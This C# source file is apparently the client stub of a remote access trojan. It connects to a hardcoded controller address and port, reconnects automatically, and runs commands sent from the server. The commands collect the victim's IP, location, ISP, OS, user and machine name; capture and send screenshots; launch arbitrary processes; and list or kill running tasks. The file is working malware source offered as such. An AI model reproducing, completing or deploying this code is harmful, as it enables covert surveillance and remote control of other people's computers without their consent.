using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Stub.Forms
{
    public partial class StubForm : Form
    {
        public string IP = "127.0.0.1"; //hardcoded ip for testing.
        public int Port = 8888; //hardcoded port for testing.

        //client socket variable.
        private Helpers.ClientSocket clientSocket;

        public StubForm()
        {
            InitializeComponent();

            //initializes client socket variable.
            clientSocket = new Helpers.ClientSocket();
            //connection changed event.
            clientSocket.onConnectionChanged += ClientSocket_onConnectionChanged;
            //command recieved event.
            clientSocket.onCommandReceived += ClientSocket_onCommandReceived;
        }

        private void ClientSocket_onCommandReceived(Helpers.CommandHandler.Commands command, string data)
        {
            switch (command)
            {
                case Helpers.CommandHandler.Commands.GET_INFO:
                    using (WebClient client = new WebClient())
                    {
                        //i understand that json would be better here but i don't want my stub having extra .dll's

                        //this gets the current IPAddress
                        string input = client.DownloadString("https://ipv4.wtfismyip.com/json");

                        //regex pattern to get the ip of the user.
                        string ipPattern = "\"YourFuckingIPAddress\": \"(.*?)\",";
                        //regex pattern to get the location of the user
                        string locationPattern = "\"YourFuckingLocation\": \"(.*?)\",";
                        //regex pattern to get the hostname of the user
                        string ispPattern = "\"YourFuckingHostname\": \"(.*?)\",";
                        //regex pattern to get the ip of the use
                        string hostPattern = "\"YourFuckingISP\": \"(.*?)\",";

                        //gets the ip using the regex pattern and input
                        string ip = Regex.Matches(input, ipPattern)[0].Groups[1].Value.Split('"')[0];
                        //gets the location using the regex pattern and input
                        string location = Regex.Matches(input, locationPattern)[0].Groups[1].Value.Split('"')[0];
                        //gets the isp using the regex pattern and input
                        string isp = Regex.Matches(input, ispPattern)[0].Groups[1].Value.Split('"')[0];
                        //gets the host using the regex pattern and input
                        string host = Regex.Matches(input, hostPattern)[0].Groups[1].Value.Split('"')[0];


                        //gets the os version string
                        string os = Environment.OSVersion.VersionString;
                        //gets the current user name
                        string userName = Environment.UserName;
                        //gets the current machine name
                        string pcName = Environment.MachineName;

                        //appends all the data to variable
                        string info = $"{ip}~{location}~{isp}~{host}~{os}~{userName}~{pcName}";

                        //sends the info to the server
                        clientSocket.SendString(info, Helpers.CommandHandler.Commands.GET_INFO);
                    }
                    break;
                case Helpers.CommandHandler.Commands.SCREEN_CAPTURE:
                    //gets the current screen of the user.
                    Screen currentScreen = Screen.FromControl(new StubForm());
                    //gets the screens width.
                    int w = currentScreen.Bounds.Width;
                    //gets the screens height.
                    int h = currentScreen.Bounds.Height;
                    //create a new bitmap using the width, and height.
                    Bitmap screen = new Bitmap(w, h);
                    //creating a new graphics object from the bitmap
                    using (Graphics graphics = Graphics.FromImage(screen))
                    {
                        //copying data from the screen.
                        graphics.CopyFromScreen(0, 0, 0, 0, screen.Size);
                        //initializing a new memory stream
                        using (MemoryStream stream = new MemoryStream())
                        {
                            //saving the image to the memory stream.
                            screen.Save(stream, ImageFormat.Jpeg);
                        }
                    }

                    //initializing a new image converter
                    ImageConverter converter = new ImageConverter();
                    //converting bitmap to byte[] using the initialized imageconverter.
                    byte[] sendBytes = (byte[])converter.ConvertTo(screen, typeof(byte[]));
                    //sending bytes to the server.
                    clientSocket.SendData(sendBytes);
                    break;
                case Helpers.CommandHandler.Commands.OPEN_PROCESS:
                    //opens the process using the data string provided.
                    Process.Start(data);
                    break;
                case Helpers.CommandHandler.Commands.TASK_LIST:
                    string toSend = string.Empty;

                    //looping the current processes
                    foreach (Process proc in Process.GetProcesses())
                    {
                        //gets the process name
                        string procName = proc.ProcessName;
                        //gets the window title of the process
                        string windowTitle = proc.MainWindowTitle;

                        //appends data to string
                        toSend += $"{procName}~{windowTitle}{Environment.NewLine}";
                    }

                    //sends data to server
                    clientSocket.SendString(toSend, Helpers.CommandHandler.Commands.TASK_LIST);
                    break;
                case Helpers.CommandHandler.Commands.KILL_TASK:
                    //loops the current processes
                    foreach (Process proc in Process.GetProcesses())
                    {
                        //if process name is task name from data
                        if (proc.ProcessName == data)
                        {
                            //kill task
                            proc.Kill();
                        }
                    }
                    break;
                case Helpers.CommandHandler.Commands.EXIT:
                    //kills the current process. (for killing/closing) the connection)
                    Environment.Exit(1);
                    break;
            }
        }

        private void ClientSocket_onConnectionChanged(bool connected)
        {
            //checks to see if the socket isnt connected
            if (!(connected))
            {
                //atempts to reconnect to the server
                clientSocket.Connect(IP, Port);
            }
        }

        private void MainForm_Load(object sender, EventArgs e)
        {
            //attempts to make a connection with the server.
            clientSocket.Connect(IP, Port);
        }
    }
}
